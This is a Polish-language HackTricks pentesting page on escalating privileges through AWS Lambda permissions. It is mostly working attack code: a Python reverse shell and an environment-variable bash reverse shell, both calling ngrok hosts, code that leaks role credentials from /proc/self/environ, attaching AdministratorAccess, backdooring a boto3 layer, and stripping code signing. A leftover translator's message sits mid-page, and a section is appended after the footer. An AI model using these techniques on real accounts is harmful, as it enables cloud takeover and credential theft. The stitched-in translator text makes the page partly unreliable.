# AWS - Lambda Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## lambda

Więcej informacji o lambda w:

{{#ref}}
../../aws-services/aws-lambda-enum.md
{{#endref}}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Użytkownicy z uprawnieniami **`iam:PassRole`, `lambda:CreateFunction` i `lambda:InvokeFunction`** mogą eskalować swoje uprawnienia.\
Mogą **utworzyć nową funkcję Lambda i przypisać jej istniejącą rolę IAM**, przyznając funkcji uprawnienia związane z tą rolą. Użytkownik może następnie **napisać i wgrać kod do tej funkcji Lambda (np. zawierający rev shell)**.\
Po skonfigurowaniu funkcji, użytkownik może **uruchomić jej wykonanie** i wykonywać zamierzone działania, wywołując funkcję Lambda przez AWS API. To podejście pozwala użytkownikowi wykonywać zadania pośrednio przez funkcję Lambda, działając z poziomem dostępu przyznanym roli IAM skojarzonej z tą funkcją.\\

Atakujący mógłby to wykorzystać, aby uzyskać **rev shell i ukraść token**:
```python:rev.py
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```

```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Możesz również **abuse the lambda role permissions** bezpośrednio z lambda function.\
Jeśli lambda role miałaby wystarczające permissions, mógłbyś użyć jej, aby nadać sobie admin rights:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Możliwe jest również leak poświadczeń roli lambda bez potrzeby nawiązywania połączenia zewnętrznego. Byłoby to przydatne dla **Network isolated Lambdas** używanych do zadań wewnętrznych. Jeśli nieznane security groups filtrują twoje reverse shells, ten fragment kodu pozwoli ci bezpośrednio leak poświadczeń jako output of the lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potencjalny wpływ:** Bezpośrednie privesc do określonej lambda service role.

> [!CAUTION]
> Zwróć uwagę, że nawet jeśli **`lambda:InvokeAsync`** może wyglądać interesująco, **nie** pozwala samodzielnie na wykonanie **`aws lambda invoke-async`**, potrzebujesz też `lambda:InvokeFunction`

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Jak w poprzednim scenariuszu, możesz **przyznać sobie uprawnienie `lambda:InvokeFunction`** jeśli masz uprawnienie **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potencjalny wpływ:** Direct privesc do wskazanej roli serwisowej lambda.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Użytkownicy posiadający **`iam:PassRole`, `lambda:CreateFunction`, oraz `lambda:CreateEventSourceMapping`** uprawnienia (a potencjalnie także `dynamodb:PutItem` i `dynamodb:CreateTable`) mogą pośrednio **escalate privileges** nawet bez `lambda:InvokeFunction`.\
Mogą utworzyć **Lambda function z złośliwym kodem i przypisać jej istniejącą IAM role**.

Zamiast bezpośrednio wywoływać Lambda, użytkownik tworzy lub wykorzystuje istniejącą tabelę DynamoDB, łącząc ją z Lambda poprzez event source mapping. Ta konfiguracja zapewnia, że Lambda function jest **uruchamiana automatycznie po dodaniu nowego elementu** do tabeli, albo w wyniku działania użytkownika, albo innego procesu, tym samym pośrednio wywołując Lambda function i wykonując kod z uprawnieniami przekazanej IAM role.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Jeśli DynamoDB jest już aktywny w środowisku AWS, użytkownik musi jedynie **skonfigurować event source mapping** dla funkcji Lambda. Jeśli jednak DynamoDB nie jest używany, użytkownik musi **utworzyć nową tabelę** z włączonym strumieniowaniem:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Teraz można **połączyć funkcję Lambda z tabelą DynamoDB** poprzez **utworzenie event source mapping**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Jeżeli funkcja Lambda jest powiązana z DynamoDB stream, atakujący może **pośrednio wywołać funkcję Lambda, aktywując DynamoDB stream**. Można to osiągnąć poprzez **wstawienie elementu** do tabeli DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potencjalny wpływ:** Bezpośredni privesc do wskazanej roli serwisowej lambda.

### `lambda:AddPermission`

Atakujący posiadający to uprawnienie może **przyznać sobie (lub innym) dowolne uprawnienia** (co powoduje wygenerowanie polityk opartych na zasobach, które przyznają dostęp do zasobu):
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
**Potencjalny wpływ:** Bezpośredni privesc do lambda service role poprzez przyznanie uprawnienia do modyfikacji kodu i jego uruchamiania.

### `lambda:AddLayerVersionPermission`

Atakujący posiadający to uprawnienie może **przyznać sobie (lub innym) uprawnienie `lambda:GetLayerVersion`**. Może uzyskać dostęp do warstwy i wyszukiwać podatności lub wrażliwe informacje.
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
**Potential Impact:** Potencjalny dostęp do wrażliwych informacji.

### `lambda:UpdateFunctionCode`

Użytkownicy posiadający uprawnienie **`lambda:UpdateFunctionCode`** mają możliwość **zmodyfikowania kodu istniejącej funkcji Lambda powiązanej z rolą IAM.**\
Atakujący może **modify the code of the lambda to exfiltrate the IAM credentials**.

Chociaż atakujący może nie mieć bezpośredniej możliwości wywołania funkcji, jeśli funkcja Lambda już istnieje i jest operacyjna, istnieje duże prawdopodobieństwo, że zostanie wyzwolona przez istniejące przepływy pracy lub zdarzenia, co pośrednio ułatwi wykonanie zmodyfikowanego kodu.
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
**Potencjalny wpływ:** Bezpośredni privesc do użytej roli serwisowej lambda.

### `lambda:UpdateFunctionConfiguration`

#### RCE przez zmienne środowiskowe

Z tymi uprawnieniami można dodać zmienne środowiskowe, które spowodują, że Lambda wykona dowolny kod. Na przykład w Pythonie można wykorzystać zmienne środowiskowe `PYTHONWARNING` i `BROWSER`, aby spowodować, że proces Pythona wykona dowolne polecenia:
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
Dla innych języków skryptowych dostępne są inne zmienne środowiskowe, których możesz użyć. Po więcej informacji sprawdź podsekcje dotyczące języków skryptowych w:

{{#ref}}
https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/index.html
{{#endref}}

#### RCE przez Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) pozwala dodać **code** do funkcji Lambda, ale **przechowywać go oddzielnie**, dzięki czemu kod funkcji może pozostać niewielki i **kilka funkcji może współdzielić kod**.

Wewnątrz Lambda możesz sprawdzić ścieżki, z których ładowany jest kod python, za pomocą funkcji takiej jak poniżej:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
These are the places:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

For example, the library boto3 is loaded from `/var/runtime/boto3` (4th position).

#### Eksploatacja

Można nadużyć uprawnienia `lambda:UpdateFunctionConfiguration`, aby **dodać nowy layer** do funkcji lambda. Aby wykonać dowolny kod, ten layer musi zawierać jakąś **bibliotekę, którą lambda zaimportuje.** Jeśli możesz odczytać kod lambdy, łatwo to znajdziesz; zwróć też uwagę, że lambda może **już używać layera** i możesz **pobrać** ten layer i **dodać tam swój kod**.

Na przykład, załóżmy, że lambda używa biblioteki boto3 — to stworzy lokalny layer z najnowszą wersją tej biblioteki:
```bash
pip3 install -t ./lambda_layer boto3
```
Możesz otworzyć `./lambda_layer/boto3/__init__.py` i **add the backdoor in the global code** (funkcję do exfiltrate credentials lub get a reverse shell, na przykład).

Następnie spakuj katalog `./lambda_layer` i **upload the new lambda layer** na swoje konto (lub na konto ofiary, ale możesz nie mieć do tego uprawnień).  
Zwróć uwagę, że musisz utworzyć folder python i umieścić tam biblioteki, aby nadpisać /opt/python/boto3. Ponadto warstwa musi być **compatible with the python version** używana przez lambda, a jeśli uploadujesz ją na swoje konto, musi być w **same region:**
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
Teraz spraw, aby przesłana lambda layer była **dostępna dla dowolnego konta**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
I dołącz lambda layer do funkcji lambda ofiary:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Następnym krokiem byłoby albo samodzielne **wywołanie funkcji**, jeśli potrafimy, albo poczekać, aż **zostanie wywołana** normalnymi środkami — co jest bezpieczniejszą metodą.

Bardziej ukryty sposób wykorzystania tej luki można znaleźć w:

{{#ref}}
../../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md
{{#endref}}

**Potential Impact:** Bezpośrednie privesc do użytej roli serwisowej lambda.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Może z tymi uprawnieniami uda się utworzyć funkcję i uruchomić ją przez wywołanie URL... nie udało mi się znaleźć sposobu, by to przetestować, więc daj znać, jeśli ty to zrobisz!

### Lambda MitM

Niektóre lambdas będą **odbierać w parametrach wrażliwe dane od użytkowników.** Jeśli uzyskasz RCE w jednej z nich, możesz wyeksfiltrować informacje, które inni użytkownicy do niej wysyłają; zobacz to w:

{{#ref}}
../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md
{{#endref}}

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{{#include ../../../../banners/hacktricks-training.md}}




### `lambda:DeleteFunctionCodeSigningConfig` or `lambda:PutFunctionCodeSigningConfig` + `lambda:UpdateFunctionCode` — Bypass Lambda Code Signing

Jeśli funkcja Lambda wymusza code signing, atakujący, który może usunąć Code Signing Config (CSC) lub obniżyć jego poziom do Warn, może wdrożyć do funkcji niepodpisany kod. To omija mechanizmy ochrony integralności bez modyfikowania IAM role funkcji lub triggerów.

Permissions (one of):
- Path A: `lambda:DeleteFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`
- Path B: `lambda:CreateCodeSigningConfig`, `lambda:PutFunctionCodeSigningConfig`, `lambda:UpdateFunctionCode`

Notes:
- For Path B, you don't need an AWS Signer profile if the CSC policy is set to `WARN` (unsigned artifacts allowed).

Steps (REGION=us-east-1, TARGET_FN=<target-lambda-name>):

Przygotuj mały payload:
```bash
cat > handler.py <<'PY'
import os, json
def lambda_handler(event, context):
return {"pwn": True, "env": list(os.environ)[:6]}
PY
zip backdoor.zip handler.py
```
Ścieżka A) Usuń CSC, następnie zaktualizuj kod:
```bash
aws lambda get-function-code-signing-config --function-name $TARGET_FN --region $REGION && HAS_CSC=1 || HAS_CSC=0
if [ "$HAS_CSC" -eq 1 ]; then
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION
fi
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Ścieżka B) Downgrade to Warn and update code (if delete not allowed):
```bash
CSC_ARN=$(aws lambda create-code-signing-config \
--description ht-warn-csc \
--code-signing-policies UntrustedArtifactOnDeployment=WARN \
--query CodeSigningConfig.CodeSigningConfigArn --output text --region $REGION)
aws lambda put-function-code-signing-config --function-name $TARGET_FN --code-signing-config-arn $CSC_ARN --region $REGION
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://backdoor.zip --region $REGION
# If the handler name changed, also run:
aws lambda update-function-configuration --function-name $TARGET_FN --handler handler.lambda_handler --region $REGION
```
Verified. I will translate the README.md content to Polish while strictly following your rules:
- Preserve all markdown/html tags, links, refs, paths and code exactly as-is (no translation or modification).
- Do not translate code, hacking technique names, common hacking words, cloud/SaaS platform names, the word "leak", "pentesting", links or markdown tags.
- Return only the translated markdown content (no extra text).
```bash
aws lambda invoke --function-name $TARGET_FN /tmp/out.json --region $REGION >/dev/null
cat /tmp/out.json
```
Potencjalny wpływ: Możliwość przesłania i uruchomienia dowolnego niesygnowanego kodu w funkcji, która miała wymuszać podpisane wdrożenia, co może prowadzić do wykonania kodu z uprawnieniami roli funkcji.

Czyszczenie:
```bash
aws lambda delete-function-code-signing-config --function-name $TARGET_FN --region $REGION || true
```

